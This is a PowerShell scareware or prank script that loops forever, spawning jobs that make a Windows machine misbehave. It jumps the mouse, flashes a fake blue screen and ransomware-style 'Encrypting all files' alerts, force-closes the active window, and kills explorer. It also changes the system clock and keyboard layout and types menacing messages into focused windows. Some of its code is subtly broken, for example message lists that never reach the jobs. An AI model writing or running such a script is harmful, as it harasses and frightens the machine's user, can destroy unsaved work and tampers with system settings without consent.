Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Mouse {
    [DllImport("user32.dll")]
    public static extern void SetCursorPos(int x, int y);
}
public class MsgBox {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, string text, string caption, int options);
}
"@

$wshell = New-Object -ComObject WScript.Shell
$speech = New-Object -ComObject SAPI.SpVoice
$errors = @("BIOS FAILURE: SYSTEM REPAIR REQUIRED", 
            "FATAL ERROR: WINDOWS SELF-DESTRUCT SEQUENCE INITIATED", 
            "CRITICAL FAILURE: HARD DRIVE CORRUPTION DETECTED", 
            "WARNING: UNAUTHORIZED REMOTE ACCESS DETECTED", 
            "ENCRYPTION KEY LOST: DATA LOCKDOWN ENABLED")
$hacker_text = @("Injecting rootkit...", "Executing backdoor command...", "Erasing logs...", "Uploading files to dark web...", "Exploiting system vulnerabilities...")
$messages = @("System lockdown in progress...", "You are no longer in control.", "I am watching you.", "Unauthorized access detected.", "This computer is now mine.")

Function Start-Chaos {
    while ($true) {
        Start-Sleep -Milliseconds (Get-Random -Minimum 300 -Maximum 1200)  # Reduced delay for speed boost
        $random = Get-Random -Minimum 1 -Maximum 20
        Start-Job -ScriptBlock {
            param ($random)
            $wshell = New-Object -ComObject WScript.Shell
            switch ($random) {
                1 {  # AI Mouse Jumps
                    $pos = [System.Windows.Forms.Cursor]::Position
                    [Mouse]::SetCursorPos($pos.X + (Get-Random -Minimum -600 -Maximum 600), 
                                          $pos.Y + (Get-Random -Minimum -600 -Maximum 600))
                }
                2 {  # Fake BSOD
                    Add-Type -AssemblyName System.Windows.Forms
                    $form = New-Object System.Windows.Forms.Form
                    $form.BackColor = "Blue"
                    $form.WindowState = "Maximized"
                    $form.TopMost = $true
                    $form.FormBorderStyle = "None"
                    $label = New-Object System.Windows.Forms.Label
                    $label.Text = "A fatal system error has occurred. Restarting..."
                    $label.ForeColor = "White"
                    $label.Font = New-Object System.Drawing.Font("Arial", 25, [System.Drawing.FontStyle]::Bold)
                    $label.AutoSize = $true
                    $label.Location = New-Object System.Drawing.Point(100, 100)
                    $form.Controls.Add($label)
                    $form.Show()
                    Start-Sleep -Seconds 2  # Flash time reduced
                    $form.Close()
                }
                3 {  # Close Active Window FAST
                    $wshell.SendKeys("%{F4}")
                }
                4 {  # Open CMD with Fake Hacking Text
                    Start-Process cmd -ArgumentList "/k echo $($hacker_text | Get-Random)"
                }
                5 {  # Fake System Encryption Alert
                    [MsgBox]::MessageBox([IntPtr]::Zero, "Encrypting all files...", "Windows Security Alert", 0x10)
                }
                6 {  # Flash Black Screen
                    $wshell.SendKeys("{F11}")
                    Start-Sleep -Milliseconds 250  # Faster flash
                    $wshell.SendKeys("{F11}")
                }
                7 {  # Taskbar Disappears & Reappears FAST
                    Stop-Process -Name explorer -Force
                    Start-Sleep -Seconds 1
                    Start-Process explorer
                }
                8 {  # Open Websites Rapidly
                    Start-Process "https://www.google.com/search?q=how+to+remove+a+virus"
                }
                9 {  # USB Plug/Unplug Sound FAST
                    [console]::beep(220, 100)
                    Start-Sleep -Milliseconds 200
                    [console]::beep(600, 100)
                }
                10 {  # Reverse Keyboard Layout FAST
                    Set-WinUserLanguageList "jp-JP"
                }
                11 {  # Notepad Types CREEPY Messages
                    Start-Process notepad
                    Start-Sleep -Seconds 1
                    $wshell.AppActivate("Untitled - Notepad")
                    Start-Sleep -Seconds 0.5
                    $wshell.SendKeys("You cannot stop me.")
                }
                12 {  # Changes System Time FAST
                    $hours = Get-Random -Minimum -10 -Maximum 10
                    Set-Date (Get-Date).AddHours($hours)
                }
                13 {  # Random Volume Boost
                    $wshell.SendKeys("{VOLUME_UP}")
                    Start-Sleep -Milliseconds 500
                    $wshell.SendKeys("{VOLUME_DOWN}")
                }
                14 {  # Changes Wallpaper to a Screenshot FAST
                    $wshell.SendKeys("{PRTSC}")
                    Start-Sleep -Milliseconds 300
                    $wshell.SendKeys("^v")
                }
                15 {  # Fake Error Messages FAST
                    [MsgBox]::MessageBox([IntPtr]::Zero, ($errors | Get-Random), "System Alert", 0x10)
                }
                16 {  # Make Windows Speak FAST
                    $speech = New-Object -ComObject SAPI.SpVoice
                    $speech.Speak("You are no longer in control.")
                }
                17 {  # Minimize Everything FAST
                    $wshell.SendKeys("^{ESC}")
                }
                18 {  # Spam Random Keyboard Inputs FAST
                    $wshell.SendKeys(($messages | Get-Random))
                }
                19 {  # Flash White Screen FAST
                    Add-Type -AssemblyName System.Windows.Forms
                    $form = New-Object System.Windows.Forms.Form
                    $form.BackColor = "White"
                    $form.WindowState = "Maximized"
                    $form.TopMost = $true
                    $form.FormBorderStyle = "None"
                    $form.Show()
                    Start-Sleep -Milliseconds 150  # Faster flash
                    $form.Close()
                }
                20 {  # Toggle Caps Lock & Num Lock FAST
                    $wshell.SendKeys("{CAPSLOCK}")
                    $wshell.SendKeys("{NUMLOCK}")
                }
            }
        } -ArgumentList $random | Out-Null
    }
}

Start-Chaos
